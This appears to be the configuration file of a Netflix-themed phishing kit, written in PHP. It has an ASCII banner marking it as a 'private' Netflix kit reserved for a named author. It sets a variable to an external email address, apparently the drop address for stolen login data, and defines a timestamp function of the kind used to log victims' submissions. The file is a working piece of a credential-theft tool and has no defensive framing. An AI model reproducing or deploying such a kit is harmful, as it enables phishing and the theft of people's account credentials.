﻿<?php
/*
___________.____    ._________________________
\_   _____/|    |   |   \__    ___/\_   _____/
 |    __)_ |    |   |   | |    |    |    __)_ 
 |        \|    |___|   | |    |    |        \
/_______  /|_______ \___| |____|   /_______  /
        \/         \/                      \/ ADEMƠ
        ||PRIVATE N|E|T|F|l|I|X 
        ||Bzef Del'☕ ®RESERVED TO: ADEMƠ (kIllUASHk|SHk001)
*/
	
	// HHH ZEPek
	$yours = "casanovahb@yandex.com";
	// HHH ZEPek

	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}?>